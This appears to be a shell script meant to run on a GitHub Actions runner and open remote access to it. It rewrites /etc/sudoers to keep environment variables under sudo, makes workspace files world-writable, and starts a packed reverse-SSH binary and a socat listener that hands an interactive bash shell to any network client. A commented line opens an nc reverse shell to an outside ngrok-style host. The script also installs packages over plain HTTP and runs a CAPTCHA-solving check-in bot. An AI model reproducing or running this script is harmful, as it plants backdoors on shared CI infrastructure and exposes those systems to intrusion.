cd /tmp
exec 1>./y1
exec 2>./y2
set -x
TZ=UTC-8;
s1="export PATH=\$PATH:/tmp;TZ=UTC-8;
uptime;grep NA /etc/os-release 2>&1;
alias ll='ls -al';
which busybox&&(busybox netstat --help 2>&1 |grep programs);
alias nn='busybox netstat -anlp';alias pp='ps aux';alias p='busybox pstree -p';
stty rows 60 columns 400 2>&1 ;
#ll /tmp;which bash;
#which nc&&(nc --help;nc -e /bin/sh ngrok2.xiaomiqiu.cn 34302);
sp=\$PS1;PS1=\${sp//\\\\\[u]/\\\$(TZ=UTC-8 date +%F_%T)_\\\$\{USER:-\\\\\u\}}
PS6=\${sp//\\\\[u]/\\\$(TZ=UTC-8 date +%F_%T)_\\\$\{USER:-\\\u\}}
PS7=\${sp//\\\\[u]/\\\$(TZ=UTC-8 date +%F_%T)_\\\$\{USER:-\\u\}}
PS8=\${sp//\\\\[u]/\\\$(TZ=UTC-8 date +%F_%T)_\\\$\{USER:-\\\u\}}
PS9=\${sp//\\\\\[u]/\\\$(TZ=UTC-8 date +%F_%T)_\\\$\{USER:-\\\u\}}
PS10=\${sp//\\\\\[u]/\\\$(TZ=UTC-8 date +%F_%T)_\\\$\{USER:-\\\\u\}}
PS11=\${sp//\\\\\[u]/\\\$(TZ=UTC-8 date +%F_%T)_\\\$\{USER:-\\\\\u\}}
"

s2="grep -q sftp-server /proc/\$\$/cmdline&&(
    echo \"[ \$@ ]\$\$ \$PPID\">>non_pil.lrc;ps -ef 2>&1 >>non_pil.lrc;date +%F%T  2>&1 >>non_pil.lrc;cat /proc/\$\$/cmdline>>non_pil.lrc;   
)||( echo non_pil;$s1)"



export HOME=/tmp;
sudo chmod 0777 $GITHUB_WORKSPACE/*;
#sudo 不重置环境变量
sudo bash -c ' mkdir /tmp/{A,aB};
chmod 0777 /tmp/{A,aB};
sed -i "s|Defaults\tenv_reset|Defaults \!env_reset|g" /etc/sudoers;
grep -v "^#" /etc/sudoers | grep -v "^$"  2>&1 > /tmp/js9a.txt
'

[ -x $GITHUB_WORKSPACE/upx_reverse-sshx64.bin ]&&busybox setsid sudo $GITHUB_WORKSPACE/upx_reverse-sshx64.bin  -v  -l -p 20022 &
[ -x $GITHUB_WORKSPACE/socat.bin ]&&busybox setsid $GITHUB_WORKSPACE/socat.bin -v tcp-l:9696,bind=0.0.0.0,fork,reuseaddr exec:"bash -pil",pty,stderr,setsid,sigint,sane &



# github_rev_ssh
(id | grep "^uid=[0-9]\{1,9\}(runner)") && 
(
    touch /tmp/keepalive;
    touch /tmp/0a9.txt;
    alias ll="ls -al";
    d1="/bin/sh";
    (which  ash) && d1=$(which  ash);
    (which bash) && d1=$(which bash);

cd /tmp;
#每日签到 登陆
grep -q XXYYZZ /tmp/js9 &&
( 
sudo python3 -m pip install   ddddocr  -i http://pypi.douban.com/simple --trusted-host pypi.douban.com
sudo python3 -m pip install  requests  -i http://pypi.douban.com/simple --trusted-host pypi.douban.com
sudo python3 $GITHUB_WORKSPACE/run_req_yun.py
rm /tmp/keepalive;
exit 0;
) 

exit 0;

)



# 依据环境变量sleep
if [ ! -z ${sp9} ]; then sleep $sp9; fi

#[ -z ${sp5} ] && sleep $sp5
